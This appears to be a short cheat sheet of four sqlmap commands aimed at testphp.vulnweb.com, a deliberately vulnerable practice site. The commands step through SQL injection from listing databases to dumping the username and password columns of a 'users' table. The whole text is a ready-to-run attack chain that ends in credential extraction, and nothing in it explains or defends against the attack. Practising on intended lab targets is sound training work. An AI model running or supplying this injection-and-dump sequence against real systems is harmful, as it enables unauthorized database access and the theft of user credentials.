sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart -T users --columns 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart -T users -C uname,pass --dump